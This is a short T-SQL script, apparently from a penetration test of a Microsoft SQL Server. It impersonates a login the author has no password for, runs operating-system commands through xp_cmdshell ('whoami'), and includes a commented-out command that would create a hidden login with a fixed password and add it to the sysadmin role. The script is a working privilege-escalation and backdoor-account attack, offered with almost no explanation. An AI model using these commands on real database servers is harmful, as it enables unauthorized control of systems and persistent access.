-- impersonating the user that has xp_cmdshell since I dont know its password to truely login as
EXECUTE AS LOGIN = 'batchuser_uat'
GO

EXECUTE xp_cmdshell 'whoami'
-- attempt to create a sysadmin login
--EXECUTE xp_cmdshell 'sqlcmd -S localhost,15150 -Q "create login [fake_login] with password = ''Password01''; alter server role [sysadmin] add member [fake_login];"'
GO

REVERT
GO